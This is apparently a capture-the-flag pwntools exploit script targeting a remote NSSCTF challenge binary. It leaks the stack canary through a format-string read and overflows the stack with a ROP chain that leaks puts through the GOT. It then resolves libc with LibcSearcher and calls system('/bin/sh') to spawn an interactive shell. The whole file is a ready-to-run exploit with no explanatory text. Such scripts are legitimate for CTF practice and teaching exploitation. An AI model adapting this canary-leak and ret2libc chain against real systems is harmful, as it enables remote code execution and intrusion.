#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 64
binary_name = 'pwn'
remote_addr, port = 'node4.anna.nssctf.cn:28327'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    sla(b'u!\n',b'%7$p')
    canary = int(rl().strip(b'\n'),16)
    show(f'canary==> {hex(canary)}')
    payload = b'a'*0x18 + p64(canary) + b'a'*0x8
    prdi = 0x400993
    puts_got = elf.got['puts']
    puts_plt = elf.plt['puts']
    payload += flat(prdi, puts_got, puts_plt)
    payload += p64(elf.sym['vuln'])
    sla(b'story!\n',payload)
    puts_addr = u64(rl().strip(b'\n').ljust(8, b'\x00'))
    show(f'puts_addr==> {hex(puts_addr)}')
    libc = LibcSearcher('puts',puts_addr)
    libc_base = puts_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')
    show(f'system_addr==> {hex(system_addr)}')
    show(f'bin_sh_addr==> {hex(bin_sh_addr)}')
    payload = b'a'*0x18 + p64(canary) + b'a'*0x8
    payload += flat(prdi, bin_sh_addr, system_addr)
    sla(b'story!\n',payload)
    p.interactive()
